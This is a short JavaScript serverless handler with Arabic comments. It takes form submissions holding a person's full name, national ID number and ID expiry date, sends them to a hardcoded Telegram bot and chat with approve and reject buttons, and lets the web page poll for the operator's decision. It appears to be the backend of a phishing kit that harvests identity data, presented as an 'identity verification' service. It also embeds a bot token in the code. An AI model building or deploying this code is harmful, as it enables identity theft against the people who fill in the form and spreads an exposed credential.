// تخزين مؤقت لحالة المستخدمين (لأغراض التجربة والتحقق)
global.userStatuses = global.userStatuses || {};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "9287234458:AAELwciHtjDTWTwq_IfWxEpqADMI49LEo7U";
  const CHAT_ID = "8040433133";

  // 1. التعامل مع طلب الفحص (GET Check Status) القادم من الموقع
  if (req.method === 'GET') {
    const { action, user_id } = req.query;
    if (action === 'check' && user_id) {
      const status = global.userStatuses[user_id] || 'pending';
      return res.status(200).json({ status });
    }
    return res.status(400).json({ error: 'Invalid request' });
  }

  // 2. التعامل مع طلب الإرسال (POST) القادم من نموذج الموقع
  if (req.method === 'POST') {
    let bodyData = req.body;
    if (typeof bodyData === 'string') {
      try { bodyData = JSON.parse(bodyData); } catch (e) { bodyData = {}; }
    }

    const { user_id, الاسم_الكامل, رقم_الهوية, تاريخ_انتهاء } = bodyData || {};

    if (user_id) {
      global.userStatuses[user_id] = 'pending';
    }

    const message = `🚨 *طلب تحقق جديد من الهوية*:\n\n` +
                    `👤 *الاسم*: ${الاسم_الكامل || 'غير متوفر'}\n` +
                    `🆔 *رقم الهوية*: \`${رقم_الهوية || 'غير متوفر'}\`\n` +
                    `📅 *تاريخ الانتهاء*: ${تاريخ_انتهاء || 'غير متوفر'}\n` +
                    `🔑 *User ID*: \`${user_id || 'N/A'}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_${user_id}` },
          { text: "❌ رفض", callback_data: `reject_${user_id}` }
        ]
      ]
    };

    try {
      const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          reply_markup: keyboard
        })
      });

      const telegramData = await telegramRes.json();
      return res.status(200).json({ success: true, sent_to_telegram: telegramData });

    } catch (error) {
      return res.status(500).json({ error: error.message });
    }
  }

  return res.status(405).json({ error: 'Method Not Allowed' });
}
